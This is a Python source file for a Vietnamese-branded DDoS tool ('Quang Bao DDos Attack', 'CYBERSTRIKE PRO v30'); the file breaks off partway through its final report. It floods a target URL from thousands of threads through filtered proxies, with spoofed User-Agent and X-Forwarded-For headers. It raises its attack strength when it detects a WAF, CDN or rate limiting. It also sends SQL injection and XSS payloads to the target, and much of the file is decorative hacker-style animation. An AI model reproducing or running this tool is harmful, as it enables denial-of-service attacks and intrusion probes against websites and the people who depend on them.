#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ☠️ ©2025 Quang Bao DDos Attack ☠️

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import sys
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich.table import Table
from rich import print as rprint

# Khởi tạo console với theme màu nâng cấp
custom_theme = Theme({
    "info": "bold cyan blink",
    "warning": "bold yellow italic",
    "error": "bold red underline",
    "success": "bold green",
    "highlight": "bold magenta",
    "extra": "bold white",
    "blue": "bold blue",
    "dimmed": "dim magenta",
    "purple": "bold purple",
    "dim_cyan": "dim cyan",
    "yellow": "bold yellow blink",
    "dim_green": "dim green italic"
})
console = Console(theme=custom_theme)

# Danh sách ký tự cho hiệu ứng mưa mã
MATRIX_CHARS = "01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()"

# Tạo mưa mã (Matrix-style code rain) với hiệu ứng rơi nâng cấp
def generate_code_rain(width=50, height=10, frame=0):
    rain = []
    colors = ["green", "cyan", "magenta", "purple"]
    for i in range(height):
        offset = (frame + i) % height
        line = "".join(random.choice(MATRIX_CHARS) if random.random() > 0.15 else " " for _ in range(width))
        color = random.choice(colors)
        rain.append(f"[{color}]{line}[/]")
    return "\n".join(rain)

# Hiệu ứng chờ siêu xịn với mưa mã, đa thanh tiến trình, và ánh sáng nhấp nháy
def matrix_effect(speed="fast"):
    message = "Đang khởi động hệ thống...©2025 Quang Bao DDos Attack..."
    colors = ["cyan", "magenta", "purple", "blue", "green"]
    symbols = ["⚡", "★", "☠️", "⚙", "💥"]
    radar_frames = ["◢", "◣", "◤", "◥", "⬢"]
    sound_effects = ["*BEEP*", "*TICK*", "*HUM*", "*ZAP*", "*BOOM*"]
    spinners = ["aesthetic", "dots", "bounce", "point", "stars"]
    sleep_time = 0.02 if speed == "fast" else 0.05
    
    with Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=20, style="red", complete_style="cyan"),
        console=console
    ) as progress1, Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=20, style="magenta", complete_style="purple"),
        console=console
    ) as progress2, Progress(
        SpinnerColumn(spinner_name=random.choice(spinners)),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=20, style="blue", complete_style="green"),
        console=console
    ) as progress3:
        task1 = progress1.add_task("[bold cyan]Kết nối mạng[/]", total=len(message))
        task2 = progress2.add_task("[bold magenta]Tải module[/]", total=len(message))
        task3 = progress3.add_task("[bold green]Kích hoạt hệ thống[/]", total=len(message))
        
        radar_index = 0
        for i in range(len(message) + 1):
            partial_message = message[:i]
            color = colors[i % len(colors)]
            symbol = random.choice(symbols)
            radar = radar_frames[radar_index % len(radar_frames)]
            sound = random.choice(sound_effects)
            style = "bold blink" if i % 2 == 0 else "dim"
            display_text = f"[bold {color}]{radar} {symbol} {partial_message} {symbol} {radar} [yellow]{sound}[/][/]"

            console.print(generate_code_rain(frame=i), justify="center")
            console.print("")
            progress1.update(task1, advance=1, description=f"[bold cyan]Kết nối mạng: {display_text}[/]")
            if i >= len(message) // 3:
                progress2.update(task2, advance=1, description=f"[bold magenta]Tải module: {display_text}[/]")
            if i >= 2 * len(message) // 3:
                progress3.update(task3, advance=1, description=f"[bold green]Kích hoạt hệ thống: {display_text}[/]")
            
            radar_index += 1
            time.sleep(sleep_time)

# Tùy chọn giao diện màu và tốc độ hiệu ứng
def select_theme():
    colors = ["cyan", "magenta", "green", "blue", "purple"]
    speeds = ["fast", "slow"]
    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Chọn theme màu:[/]")
    for color in colors:
        console.print(f"[bold {color}]  - {color.capitalize()} █[/]")
        time.sleep(0.02)
    color_choice = Prompt.ask(
        "[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Nhập màu (cyan/magenta/green/blue/purple):[/] ",
        choices=colors, default="purple"
    )
    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Chọn tốc độ hiệu ứng:[/]")
    for speed in speeds:
        console.print(f"[bold yellow]  - {speed.capitalize()} ⚡[/]")
        time.sleep(0.02)
    speed_choice = Prompt.ask(
        "[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Nhập tốc độ (fast/slow):[/] ",
        choices=speeds, default="fast"
    )
    console.print(f"[success]Đã chọn theme [bold {color_choice}]{color_choice.capitalize()}[/] và tốc độ [bold yellow]{speed_choice.capitalize()}[/] [✓][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
    return color_choice, speed_choice

# Logo ASCII siêu khủng với hiệu ứng màu gradient
def display_logo(theme_color):
    logo = f"""
[bold {theme_color}]        ________
       /|_||_\`.__
      (   _    _ _\`-(_)--(_)-(_) [/]
       `-_  CYBERSTRIKE  _-'
          `._  v30  _.' ☠️
"""
    colors = ["magenta", "cyan", "purple", "blue", "green"]
    for i, line in enumerate(logo.splitlines()):
        console.clear()
        console.print("\n".join(logo.splitlines()[:i+1]), style=colors[i % len(colors)] + " blink")
        time.sleep(0.02)
    console.print(f"[success]CYBERSTRIKE PRO v30 [✓][/] [yellow]*ZAP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Hiệu ứng radar nâng cấp
def display_radar_effect(theme_color):
    frames = [
        f"[bold {theme_color}]Quang Bảo DDos Attack 2025[/] ◢",
        f"[bold magenta]Nghiêm Cấm Sử Dụng Tool Trái Phép [/] ◣",
        f"[bold green]Adm: ©2025 Quang Bao DDos Attack[/] ◤",
        f"[bold yellow]Hệ thống sẵn sàng! [/] ◥",
        f"[bold purple]Chiến đấu! ☠️[/] ⬢"
    ]
    for frame in frames:
        console.clear()
        console.print(frame, style="blink")
        time.sleep(0.06)
    console.clear()

# ASCII art khi thoát
def display_exit_banner(theme_color):
    frames = [
        f"[bold {theme_color}]Hệ thống đang thoát...[/] 💥",
        f"[bold magenta]Cảm ơn đã sử dụng![/] ⚡",
        f"[bold green]©2025 Quang Bao DDos Attack[/] ☠️"
    ]
    for frame in frames:
        console.clear()
        console.print(frame, style="blink")
        time.sleep(0.08)
    console.clear()

# Đọc proxy từ file
def load_proxies_from_file(proxy_file):
    global PROXY_LIST
    PROXY_LIST = []
    try:
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            PROXY_LIST = [f"http://{proxy}" if not proxy.startswith(('http://', 'https://')) else proxy for proxy in proxies]
        console.print(f"[success]Đã tải [bold {theme_color}]{len(PROXY_LIST)}[/] proxy từ {proxy_file} [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
    except Exception as e:
        console.print(f"[error]Lỗi đọc file proxy: [red]{str(e)}[/] [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)

# Kiểm tra proxy với hỗ trợ HTTPS
async def test_proxy(proxy, timeout=10):
    try:
        async with aiohttp.ClientSession() as session:
            start = time.time()
            for scheme in ["http", "https"]:
                test_url = f"{scheme}://httpbin.org/ip"
                try:
                    async with session.get(test_url, proxy=proxy, timeout=timeout) as response:
                        if response.status == 200:
                            return True, (time.time() - start) * 1000
                except aiohttp.ClientError:
                    continue
        return False, float('inf')
    except Exception:
        return False, float('inf')

# Lọc và sắp xếp proxy theo tốc độ
async def filter_active_proxies(theme_color):
    global PROXY_LIST
    if not PROXY_LIST:
        console.print(f"[warning]Không có proxy trong file! Chạy không proxy. [⚠][/] [yellow]*HUM*[/] [yellow]©2025 Quang Bao DDos Attack [/]")
        return
    tasks = [test_proxy(proxy, timeout=10) for proxy in PROXY_LIST]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    active_proxies = []
    for proxy, (is_active, response_time) in zip(PROXY_LIST, results):
        if is_active and response_time < 1000:
            active_proxies.append((proxy, response_time))
    active_proxies.sort(key=lambda x: x[1])
    PROXY_LIST = [proxy for proxy, response_time in active_proxies if response_time < 200]
    console.print(f"[success]Lọc được [bold {theme_color}]{len(PROXY_LIST)}[/] proxy hoạt động (nhanh nhất <200ms) [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Làm mới proxy định kỳ
async def refresh_proxies_periodically(proxy_file):
    while True:
        load_proxies_from_file(proxy_file)
        await filter_active_proxies(theme_color)
        await asyncio.sleep(20)

# Dấu nhắc hacker động
def hacker_prompt(message, default=None, theme_color="purple"):
    symbols = ["⚡", "★", "☠️", "⚙", "💥"]
    colors = ["cyan", "magenta", "purple", "blue"]
    prompt_text = f"[bold {random.choice(colors)}]┌─[quangbao㉿attack]─[~]─[{random.choice(symbols)}]\n└─# [bold blue]{message}[/]"
    console.print("")
    return Prompt.ask(prompt_text, default=default)

# Kiểm tra khóa xác thực
def check_auth_key(theme_color):
    console.clear()
    console.print(f"[bold {theme_color}]CHÀO MỪNG ĐẾN BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
    time.sleep(0.5)
    console.clear()
    key = hacker_prompt("Nhập key xác thực: ", theme_color=theme_color)
    if key != "baoddos":
        console.print("[error]Key không đúng! Thoát. [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)
    console.print("[success]Key hợp lệ! Truy cập hệ thống. [✓][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Kiểm tra tính toàn vẹn tệp
def check_file_integrity():
    global EXPECTED_HASH
    EXPECTED_HASH = None
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[success]Tạo mã băm: [bold magenta]{file_hash[:10]}...[/] [✓][/] [yellow]*PING*[/] [yellow] ©2025 Quang Bao DDos Attack ☠️[/]")
            elif file_hash != EXPECTED_HASH:
                console.print("[error]Tệp bị thay đổi! Thoát. [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                exit(1)
    except Exception as e:
        console.print(f"[error]Lỗi kiểm tra: [red]{str(e)}[/] [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)

# Hiệu ứng tải siêu khủng
def loading_animation(message, duration, theme_color):
    with Progress(
        SpinnerColumn(spinner_name="aesthetic"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=25, style="red", complete_style="cyan"),
        console=console
    ) as progress:
        task = progress.add_task(f"[bold {theme_color}]{message}[/]", total=100)
        for i in range(0, 101, 20):
            progress.update(task, advance=20, description=f"[bold {theme_color}]{message} [{i}%] [/]")
            time.sleep(duration / 5)
        progress.update(task, description=f"[success]{message} [✓][/] [yellow]*BOOM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

# Danh sách User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Tạo header ngẫu nhiên
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }

# Danh sách proxy
PROXY_LIST = []
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Bộ đếm toàn cục
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
proxy_error_count = 0

# Xác thực URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: [red]{e}[/]")

# Đánh giá mức độ bảo mật
def assess_target_security(url, theme_color):
    security_level = "TRUNG BÌNH"
    recommended_threads = 1000
    recommended_requests = 1000

    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=10)
        headers = response.headers
        waf_indicators = ['cloudflare', 'akamai', 'sucuri']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)

        if cdn_waf_detected or rate_limit:
            security_level = "CAO"
            recommended_threads = 5000
            recommended_requests = 2000
        else:
            security_level = "THẤP"
            recommended_threads = 500
            recommended_requests = 500

        console.print(f"[success]Bảo mật: [magenta]{security_level}[/], Luồng: [bold {theme_color}]{recommended_threads:,}[/], Yêu cầu: [bold {theme_color}]{recommended_requests:,}[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    except Exception as e:
        console.print(f"[error]Lỗi đánh giá: [red]{str(e)}[/]. Dùng mặc định. [✗][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

    return security_level, recommended_threads, recommended_requests

# Điều chỉnh luồng
def adjust_threads_for_device(num_threads, num_requests):
    cpu_count = multiprocessing.cpu_count()
    max_threads = min(num_threads, cpu_count * 1000)
    max_requests = min(num_requests, 9999999)
    console.print(f"[success]Điều chỉnh: [bold {theme_color}]{max_threads:,}[/] luồng, [bold {theme_color}]{max_requests:,}[/] yêu cầu trên [magenta]{cpu_count}[/] CPU. [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
    return max_threads, max_requests

# Tấn công clog với dashboard và xử lý lỗi proxy
def clog_attack(url, requests_per_thread, duration, progress, task, theme_color):
    global success_count, error_count, response_times, proxy_error_count
    session = requests.Session()
    start_time = time.time()
    max_retries = 10
    proxy_index = 0
    sound_effects = ["*BOOM*", "*CRASH*", "*ZAP*", "*VORTEX*", "*BLAST*"]

    while time.time() - start_time < duration:
        retries = 0
        current_proxy = get_random_proxy()
        while retries < max_retries:
            try:
                if current_proxy:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    proxy_active, _ = loop.run_until_complete(test_proxy(current_proxy, timeout=10))
                    loop.close()
                    if not proxy_active:
                        with manager:
                            proxy_error_count += 1
                        console.print(f"[warning]Proxy {current_proxy} không hoạt động, thử proxy khác... [⚠][/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                        current_proxy = get_random_proxy()
                        retries += 1
                        continue

                headers = generate_random_headers()
                scheme = "https" if url.startswith("https://") else "http"
                response = session.get(url, headers=headers, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)
                sound = random.choice(sound_effects)
                console.print(f"[success]CLOG: Mã trạng thái: [bold {theme_color}]{response.status_code}[/] [✓][/] [yellow]{sound}[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

                with manager:
                    success_count += 1
                    response_times.append((time.time() - start_time) * 1000)
                    error_rate = (error_count / max(1, success_count + error_count)) * 100
                    ping_avg = sum(response_times) / len(response_times) if response_times else 0
                    rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                    rps_bar = "█" * min(int(rps / 10), 15)
                    ping_bar = "█" * min(int(ping_avg / 50), 15)
                    error_bar = "▒" * min(int(error_rate / 5), 15)
                    proxy_bar = "▓" * min(int(proxy_error_count / 5), 15)
                    rps_color = "bold magenta" if rps > 50 else "bold green" if success_count % 2 == 0 else "bold yellow"
                    progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG[/] [✓][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                break
            except requests.exceptions.ReadTimeout as e:
                retries += 1
                if retries == max_retries:
                    with manager:
                        error_count += 1
                        error_rate = (error_count / max(1, success_count + error_count)) * 100
                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
                        rps = error_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                        rps_bar = "█" * min(int(rps / 10), 15)
                        ping_bar = "█" * min(int(ping_avg / 50), 15)
                        error_bar = "▒" * min(int(error_rate / 5), 15)
                        proxy_bar = "▓" * min(int(proxy_error_count / 5), 15)
                        rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                        progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                    console.print(f"[error]CLOG: Thất bại sau {max_retries} lần: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                else:
                    console.print(f"[warning]CLOG: Timeout, thử lại lần {retries + 1}... [⚠][/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                    current_proxy = get_random_proxy()
                    time.sleep(random.uniform(0.05, 0.5))
            except Exception as e:
                if "Tunnel connection failed: 400 Bad Request" in str(e):
                    with manager:
                        proxy_error_count += 1
                    console.print(f"[warning]Proxy lỗi 400: {current_proxy}, thử proxy khác... [⚠][/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
                    current_proxy = get_random_proxy()
                    retries += 1
                    continue
                with manager:
                    error_count += 1
                    error_rate = (error_count / max(1, success_count + error_count)) * 100
                    ping_avg = sum(response_times) / len(response_times) if response_times else 0
                    rps = error_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                    rps_bar = "█" * min(int(rps / 10), 15)
                    ping_bar = "█" * min(int(ping_avg / 50), 15)
                    error_bar = "▒" * min(int(error_rate / 5), 15)
                    proxy_bar = "▓" * min(int(proxy_error_count / 5), 15)
                    rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
                    progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
                console.print(f"[error]CLOG: Thất bại: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                break
        time.sleep(random.uniform(0.00005, 0.0001))

# Quét lỗ hổng
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=10) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"SQL Injection: {payload}",
                            "recommendation": "Sử dụng prepared statements."
                        })
                        break
        except Exception as e:
            console.print(f"[error]SQL Scan: Lỗi: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=10) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS: {payload}",
                            "recommendation": "Mã hóa output."
                        })
                        break
        except Exception as e:
            console.print(f"[error]XSS Scan: Lỗi: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

    return vulnerabilities

# Hiển thị báo cáo lỗ hổng
def display_vulnerability_report(vulnerabilities, theme_color):
    panel = Panel(
        "\n".join(
            f"[magenta]Loại:[/] {vuln['type']}\n"
            f"[yellow]Mức độ:[/] {vuln['severity']}\n"
            f"[cyan]Mô tả:[/] {vuln['description']}\n"
            f"[green]Khuyến nghị:[/] {vuln['recommendation']}\n"
            for vuln in vulnerabilities
        ) or "[success]Không phát hiện lỗ hổng! [✓][/] [yellow]*HUM*[/] [yellow]©2025 Quang Bao DDos Attack [/]",
        title=f"[bold {theme_color}]BÁO CÁO LỖ HỔNG[/]",
        border_style="dim cyan"
    )
    console.print("")
    console.print(panel)
    hacker_prompt("Nhấn Enter để quay lại: ", theme_color=theme_color)

# Hiển thị menu chính
def display_menu(theme_color):
    title = "Quang Bảo Sinh Năm 2007 "
    frames = [
        f"[bold cyan]{title} [/]",
        f"[bold magenta] {title} [/]",
        f"[bold purple]{title} [/]",
        f"[bold blue]{title} [/]",
        f"[bold green] {title} [/]"
    ]
    for frame in frames:
        console.print(frame, style="blink")
        time.sleep(0.06)

    table = Table(show_header=True, header_style=f"bold {theme_color}", border_style="dim cyan", title=f"[bold {theme_color}]{title}[/]")
    table.add_column(" LỰA CHỌN ", justify="center", style="bold magenta", width=12)
    table.add_column(" CHỨC NĂNG ", justify="center", style="bold magenta", width=20)

    table.add_row("1", "[magenta]TẤN CÔNG CLOG[/]")
    table.add_row("2", "[magenta]QUÉT LỖ HỔNG[/]")
    table.add_row("3", "[magenta]THOÁT[/]")

    console.print(f"[bold {theme_color}][/]")
    console.print(table)
    console.print(f"[bold {theme_color}][/]")
    console.print(f"[yellow] ©2025 Quang Bao DDos Attack [/]")
    console.print("")

# Hàm chính
def main():
    global theme_color
    theme_color, speed = select_theme()
    matrix_effect(speed)
    display_logo(theme_color)
    check_file_integrity()
    check_auth_key(theme_color)
    multiprocessing.set_start_method('spawn')

    # Xử lý tham số dòng lệnh
    if len(sys.argv) != 6:
        console.print(f"[error]Sử dụng: {sys.argv[0]} <URL> <threads> <requests_per_thread> <duration> <proxy_file> [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)

    try:
        input_url = sys.argv[1]
        num_threads = int(sys.argv[2])
        requests_per_thread = int(sys.argv[3])
        duration = int(sys.argv[4])
        proxy_file = sys.argv[5]

        if not (1 <= num_threads <= 999999):
            raise ValueError("Số luồng phải từ 1-999999")
        if not (1 <= requests_per_thread <= 9999999):
            raise ValueError("Số yêu cầu phải từ 1-9999999")
        if duration < 1:
            raise ValueError("Thời gian phải > 0")
        if not os.path.isfile(proxy_file):
            raise ValueError(f"File proxy {proxy_file} không tồn tại")
    except ValueError as e:
        console.print(f"[error]Lỗi: [red]{str(e)}[/] [✗][/] [yellow]*CRASH*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
        exit(1)

    validated_url = validate_url(input_url)
    load_proxies_from_file(proxy_file)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(filter_active_proxies(theme_color))
    loop.create_task(refresh_proxies_periodically(proxy_file))

    while True:
        try:
            display_menu(theme_color)
            choice = hacker_prompt("Chọn (1-3): ", theme_color=theme_color)

            if choice == "3":
                console.print(f"[success]Thoát chương trình [✓][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                display_exit_banner(theme_color)
                exit(0)

            display_radar_effect(theme_color)
            host = urllib.parse.urlparse(validated_url).hostname
            port = urllib.parse.urlparse(validated_url).port or 80
            panel = Panel(
                f"[bold {theme_color}]URL/IP:[/] [green]{validated_url}[/]\n"
                f"[bold {theme_color}]Hostname:[/] [green]{host}[/]\n"
                f"[bold {theme_color}]Port:[/] [green]{port}[/]\n"
                f"[bold {theme_color}]Trạng thái:[/] [green]Đã khóa [✓][/] \n"
                f"[bold {theme_color}]Proxy:[/] [green]{len(PROXY_LIST)}[/]\n"
                f"[yellow] ©2025 Quang Bao DDos Attack [/]",
                title=f"[bold {theme_color}]THÔNG TIN MỤC TIÊU[/]",
                border_style="dim cyan"
            )
            console.print("")
            console.print(panel)

            console.print(f"[success]Mục tiêu: [bold {theme_color}]{validated_url}[/] [✓][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            loading_animation("Khóa mục tiêu", 1.2, theme_color)

            if choice == "2":
                console.print(f"[success]Bắt đầu quét lỗ hổng... [⚡][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                loading_animation("Quét lỗ hổng", 1.2, theme_color)
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities, theme_color)
                continue

            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)

            console.print(f"[success]Đánh giá bảo mật... [⚡][/] [yellow]*BEEP*[/] [yellow]©2025 Quang Bao DDos Attack [/]")
            loading_animation("Đánh giá bảo mật", 1.2, theme_color)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url, theme_color)

            if security_level == "THẤP":
                num_threads = min(recommended_threads, num_threads // 2)
                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                attack_strategy = "TẤN CÔNG VỪA"
            else:
                num_threads = max(recommended_threads, num_threads)
                requests_per_thread = max(recommended_requests, requests_per_thread)
                attack_strategy = "TẤN CÔNG MẠNH"

            panel = Panel(
                f"[bold {theme_color}]Chiến lược:[/] [magenta]{attack_strategy}[/]\n"
                f"[bold {theme_color}]Mục tiêu:[/] [green]{validated_url}[/]\n"
                f"[bold {theme_color}]Luồng:[/] [green]{num_threads:,}[/]\n"
                f"[bold {theme_color}]Yêu cầu:[/] [green]{requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Thời gian:[/] [green]{duration}[/] giây\n"
                f"[bold {theme_color}]Tổng:[/] [green]{num_threads * requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Proxy:[/] [green]{len(PROXY_LIST)}[/]\n"
                f"[yellow] ©2025 Quang Bao DDos Attack [/]",
                title=f"[bold {theme_color}]THÔNG TIN TẤN CÔNG[/]",
                border_style="dim cyan"
            )
            console.print("")
            console.print(panel)
            confirm = Confirm.ask(f"[error]Xác nhận tấn công? [?][/] [yellow]*BEEP*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            if not confirm:
                console.print(f"[warning]Hủy tấn công [⚠][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                continue

            console.print(f"[success]Khởi động tấn công... [⚡][/] [yellow]*BOOM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            loading_animation("Khởi động hệ thống", 1.2, theme_color)

            global success_count, error_count, response_times, proxy_error_count
            success_count = 0
            error_count = 0
            response_times = []
            proxy_error_count = 0
            start_time = time.time()

            with Progress(
                SpinnerColumn(spinner_name="aesthetic"),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=25, style="red", complete_style="cyan"),
                TextColumn("[green]{task.completed}/{task.total}[/]"),
                console=console
            ) as progress:
                task = progress.add_task(f"[bold {theme_color}]TẤN CÔNG CLOG[/] [⚡][/] [yellow]©2025 Quang Bao DDos Attack [/]", total=num_threads * requests_per_thread)
                threads = []
                for _ in range(num_threads):
                    t = threading.Thread(target=clog_attack, args=(validated_url, requests_per_thread, duration, progress, task, theme_color))
                    threads.append(t)
                    t.start()

                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print(f"[warning]Tấn công bị dừng [⚠][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
                    display_exit_banner(theme_color)
                    exit(0)

            total_time = time.time() - start_time
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0
            rps = (num_threads * requests_per_thread) / total_time if total_time > 0 else 0
            success_rate = (success_count / max(1, success_count + error_count)) * 100
            error_rate = (error_count / max(1, success_count + error_count)) * 100

            report = Panel(
                f"[bold {theme_color}]Tổng lượt:[/] [green]{num_threads * requests_per_thread:,}[/]\n"
                f"[bold {theme_color}]Thành công:[/] [green]{success_count:,} ({success_rate:.1f}%)[/] [✓][/] \n"
                f"[bold {theme_color}]Thất bại:[/] [red]{error_count:,} ({error_rate:.1f}%)[/] [✗][/] \n"
